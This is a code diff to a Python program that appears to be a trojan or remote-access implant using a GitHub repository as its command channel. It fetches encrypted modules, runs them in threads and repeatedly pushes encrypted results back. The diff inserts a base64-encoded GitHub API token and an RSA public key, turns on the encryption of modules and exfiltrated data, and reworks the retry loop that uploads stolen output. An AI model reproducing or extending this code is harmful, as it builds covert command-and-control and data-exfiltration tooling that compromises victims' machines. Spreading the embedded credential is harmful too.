@@ -24,9 +24,9 @@ class Config:
 		self.repo = "wendigo_test" #name of repo
 		self.usr = "daniellohrey" #username of repo owner
 		#token to use git api
-		self.token = "INSERT TOKEN"
+		self.token = "ZWQ2YTVjZTQwYTU0NDM0MmNkMjJiZGI3MDUwN2MyMWRlMzIxNjBjMw=="
 		#public key to encrypt data
-		self.pk = "INSERT PUBLIC KEY"
+		self.pk = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwVzBJRktuZWpiRWtROWt1OTMxeApLRHRJNVRncGJuK3htQ0RKcTZIOWlCOFZxZGJSdTZKUUE0ZjRrM0g3N09yU0ZxWm1EUDZDUkpCN0wwSzhBa2RnCmppaGVYR1RITmdaMkRxbmpvVHBvamM3VWVPMy9SdU5ZZnNXQUEzZWx5NmxkMmN3VDdaTStqNHk0NVVXS2o1aVgKeEZpYk9uVnVnMllhczQ3bEY2VXNjRXBpVXJSbnQyTlB6VFJxYkJneDk4ald5TUY1UGJZa2NtSXU4VkVBbE9FLwo4azEyREhkNndpTmtJSDNMYnN2cER1dDNDcHljMVVqTGhqMzJTRGZSWmpkV2R5K2ZPbmg5MEFTV1NQMlFKVGhQCmRhQXh4cng2ZzRMRkJjQWtWYjhYN1JmUGFOc1d2UUhZTGJtd1FPTzRvdXVrczcvV25MNnlXWW8yNGJqMUlpSzkKTHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
 		self.pwd = "password" #password on zipped files
 		self.sleep = "10" #time to sleep between checking for config files
 		#seed to generate filenames, also key to module key
@@ -34,7 +34,7 @@ class Config:
 		#seed to generate ids, also used as sleep key
 		self.id_s = "id_slp"
 		self.imp = "import %s"
-		self.size = "256" #block size of cipher
+		self.size = "200" #block size of cipher
 		self.size = int(self.fixstr(self.size))
 		self.sleep = int(self.fixstr(self.sleep))
 		self.tasks = Queue.Queue() #task queue
@@ -247,7 +247,7 @@ def push_data(data):
 #decrypts modules and config files
 #decrypted = zip(base64(data))
 def decrypt(data):
-	return data #dont encrypt while testing
+#	return data #dont encrypt while testing
 	decoded = base64.b64decode(data)
 	s_io = StringIO.StringIO(decoded) #open
 	zipped = zipfile.ZipFile(s_io, 'r')
@@ -260,16 +260,15 @@ def decrypt(data):
 #encrypts data before pushing it to github
 #encrypted = base64(rsa(zip(data)))
 def encrypt(data):
-	return data #dont encrypt while testing
+#	return data #dont encrypt while testing
 	key = config.pk
-	size = config.size
+	size = config.size #size needs to be less then 256 (key size in bytes)
 	offset = 0
 	encrypted = ""
 	compressed = zlib.compress(data)
 	while offset < len(compressed):
 		chunk = compressed[offset:offset+size]
-		if len(chunk) % size != 0:
-			chunk += " " * (size - len(chunk))
+		#dont need to pad because the cipher does it
 		encrypted += key.encrypt(chunk)
 		offset += size
 	return base64.b64encode(encrypted)
@@ -280,21 +279,23 @@ def run_module(**task):
 		global config
 		#config is passed to module and returned to update config options
 		conf, result = sys.modules[task[config.g_fn_s()]].run(config, **task)
-		if conf is not None:
-			config = conf
-		while True:
-			#were in a separate thread so we just keep trying to push data
-			try:
-				if result is not None:
-					push_data(result)
-				else:
-					push_data(config.g_com())
-				return
-			except:
-				time.sleep(config.sleep)
 	except:
-		#exit if we cant run or hit uncaught exception
+		#exit if we cant run
 		return
+
+	if conf is not None:
+		config = conf
+	while True:
+		#were in a separate thread so we just keep trying to push data
+		try:
+			if result is not None:
+				push_data(result)
+			else:
+				push_data(config.g_com())
+			return
+		except:
+			time.sleep(config.sleep)
+	return
 
 #runs all queued modules in new threads
 def module_runner():
